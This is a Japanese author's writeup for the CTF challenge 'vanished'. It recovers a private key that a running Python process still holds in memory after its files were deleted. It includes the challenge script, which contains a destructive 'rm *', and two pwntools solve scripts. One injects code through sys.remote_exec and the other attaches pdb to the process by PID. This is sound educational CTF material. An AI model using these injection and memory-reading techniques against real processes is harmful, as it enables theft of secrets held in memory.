# Author's Writeup for vanished

Daily AlpacaHack B-SIDE で 6/1-5 に出題した『vanished』の作問者 Writeup です。

https://alpacahack.com/daily-bside/challenges/vanished

## 問題概要

問題文:
```
見つけたらあなたのものです。

NOTE: permission denied 3 の関連問題です。
```

配布ファイルを読むと、次の Python スクリプトがサーバーで実行されていることがわかります:
```python
import os

with open("private_key", "rb") as f:
    # Flag is "Alpaca{" + my_100_bitcoin_private_key.hex() + "}"
    my_100_bitcoin_private_key = f.read()
    assert len(my_100_bitcoin_private_key) == 32

if input("are you sure you want to delete everything? (y/N): ") == "y":
    os.system("rm *")
    print("omg! my 100 bitcoin private key is also gone :(")
    os.system("sh")
```

private key はランダムな 32 バイトの文字列であることが `gen_private_key.py` からわかります:
```python
import os

private_key = b"REDACTEDREDACTEDREDACTEDREDACTED" if os.getenv("REDACTED") else os.urandom(32)
open("private_key", "wb").write(private_key)
print(f"Flag is Alpaca{{{private_key.hex()}}}")
```

簡単に言えば、「大事なファイル（ここでは private key）を消してしまったが、Python プロセスのメモリにはまだ残っているとき、どうやってデータを復元するか」という問題です。

## 解法

色んな解法があると思っています。

既に2つの解法が投稿されています。ありがとうございます。

ここでは、それらとは異なる解法を2つ紹介します。

### 解法1: `sys.remote_exec` を使う方法

Python 3.14 から `sys.remote_exec` が追加されました。

https://docs.python.org/ja/3/library/sys.html#sys.remote_exec

簡単に言えば、すでに動いている別の Python プロセスに、あとから Python スクリプトを実行させる仕組みです。

長時間動いている Python スクリプトを debug するときとかに便利そうですね。

これを利用して、 `my_100_bitcoin_private_key` を読み取ることができます。

例えば、次の `recover.py` を用意します:
```python
import sys

with open("/get-flag.py", "w") as f:
    f.write(r'''
import os, __main__
with open("/flag.txt", "w") as f:
    f.write("Alpaca{" + getattr(__main__, "my_100_bitcoin_private_key", None).hex() + "}")
    ''')

for i in range(20):
    try:
        sys.remote_exec(i, "/get-flag.py")
    except:
        pass
```

この `recover.py` を別の接続から実行します:
```python
from pwn import remote, args
import time

host = args.HOST or "localhost"
port = args.PORT or 1337

r1 = remote(host, port, level="debug")
r1.recvuntil(b": ")

r2 = remote(host, port, level="debug")
r2.recvuntil(b": ")

r1.sendline(b"y")
r1.recvline()

r1.recv()
with open("recover.py") as f:
    r1.send(b"cat << EOF > /recover.py\n")
    r1.send(f.read().encode())
    r1.send(b"\nEOF\n")

r1.recv()
r1.sendline(b"python /recover.py")

time.sleep(0.1)

r2.sendline(b"")
r2.close()

time.sleep(0.1)

r1.sendline(b"cat /flag.txt")
r1.recv()
r1.interactive()
```

### 解法2: `python -m pdb -p PID` を使う方法

t-chen さんに教えてもらった解法です。

解法1と同様に `python -m pdb -p PID` でも Python プロセスにアタッチできます。

```python
from pwn import remote, args
import time

host = args.HOST or "localhost"
port = args.PORT or 1337

r1 = remote(host, port, level="debug")
r1.recvuntil(b": ")

r2 = remote(host, port, level="debug")
r2.recvuntil(b": ")

r2.sendline(b"y")
r2.recvuntil(b"# ")

pids = []
for i in range(20):
    r2.sendline(b"ls")
    r2.recvuntil(b"# ")
    r2.sendline(f"cat /proc/{i}/cmdline".encode())
    cmdline = r2.recvuntil(b"# ").replace(b"\x00", b" ").decode()
    if cmdline.startswith("python chal.py"):
        pids.append(i)

r2.sendline(f"python -m pdb -p {pids[0]}".encode())

time.sleep(1)

r1.sendline(b"y")

r2.recvuntil(b"(Pdb) ")
r2.sendline(b"p my_100_bitcoin_private_key")
my_100_bitcoin_private_key = eval(r2.recvline())
print(f"Alpaca{{{my_100_bitcoin_private_key.hex()}}}")
```

## おわりに

解法で難易度感が大きく変わると思ったので、 Very Hard に設定しました。

他にも解法があればぜひ Writeup 投稿してください :)
